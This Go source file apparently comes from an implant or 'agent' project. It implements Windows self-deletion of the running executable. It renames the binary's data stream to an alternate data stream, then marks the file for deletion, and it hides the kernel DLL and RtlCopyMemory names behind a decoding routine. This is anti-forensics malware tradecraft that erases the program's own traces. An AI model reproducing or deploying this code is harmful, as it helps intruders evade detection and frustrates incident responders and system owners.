package lib

import (
	"agent/vars"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

type FILE_RENAME_INFO struct {
	Union struct {
		ReplaceIfExists bool
		Flags           uint32
	}
	RootDirectory  windows.Handle
	FileNameLength uint32
	FileName       [1]uint16
}

type FILE_DISPOSITION_INFO struct {
	DeleteFile bool
}

func openHandle(path *uint16) (windows.Handle, error) {
	handle, err := windows.CreateFile(
		path,
		windows.DELETE,
		0,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if err != nil {
		return 0, err
	}

	return handle, nil
}

func renameHandle(handle windows.Handle, stream_name string) error {
	var info FILE_RENAME_INFO
	stream, err := windows.UTF16FromString(stream_name)

	if err != nil {
		return err
	}

	pstream := &stream[0]
	info.FileNameLength = uint32(unsafe.Sizeof(pstream))

	windows.NewLazyDLL(Decode(vars.Path_kerneldll)).NewProc(Decode(vars.Key_rtlcopy)).Call(
		uintptr(unsafe.Pointer(&info.FileName[0])),
		uintptr(unsafe.Pointer(pstream)),
		unsafe.Sizeof(pstream),
	)

	err = windows.SetFileInformationByHandle(
		handle,
		windows.FileRenameInfo,
		(*byte)(unsafe.Pointer(&info)),
		uint32(unsafe.Sizeof(info)+unsafe.Sizeof(pstream)),
	)

	if err != nil {
		return err
	}

	return nil
}

func depositeHandle(handle windows.Handle) error {
	var info FILE_DISPOSITION_INFO
	info.DeleteFile = true

	err := windows.SetFileInformationByHandle(
		handle,
		windows.FileDispositionInfo,
		(*byte)(unsafe.Pointer(&info)),
		uint32(unsafe.Sizeof(info)),
	)

	if err != nil {
		return err
	}

	return nil
}

func SelfDelete() error {
	data, err := os.ReadFile(os.Args[0])
	if err != nil {
		return err
	}
	stream_name := ":" + GetMD5(data)[:6]

	var wpath [windows.MAX_PATH + 1]uint16
	var handle windows.Handle

	_, err = windows.GetModuleFileName(0,
		&wpath[0], windows.MAX_PATH)
	if err != nil {
		return err
	}

	handle, err = openHandle(&wpath[0])
	if err != nil || handle == windows.InvalidHandle {
		return err
	}

	err = renameHandle(handle, stream_name)
	if err != nil {
		windows.CloseHandle(handle)
		return err
	}

	windows.CloseHandle(handle)
	handle, err = openHandle(&wpath[0])
	if err != nil || handle == windows.InvalidHandle {
		return err
	}

	err = depositeHandle(handle)
	if err != nil {
		windows.CloseHandle(handle)
		return err
	}

	windows.CloseHandle(handle)
	return nil
}
